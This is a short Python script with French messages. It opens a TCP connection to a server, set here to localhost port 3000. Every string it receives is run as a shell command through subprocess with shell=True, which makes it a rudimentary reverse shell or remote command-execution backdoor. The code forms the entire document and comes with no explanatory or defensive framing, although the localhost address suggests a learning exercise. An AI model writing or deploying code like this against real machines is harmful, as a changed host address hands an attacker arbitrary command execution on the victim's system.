#!/usr/bin/env python3

import socket
import subprocess

HOST = '127.0.0.1'
PORT = 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

print('Connexion établie avec le serveur sur le port : ', PORT)

while 1:
    data = s.recv(2048).decode()
    res = subprocess.run(data, shell=True)
    print(res)
    # s.send(res)


s.close()
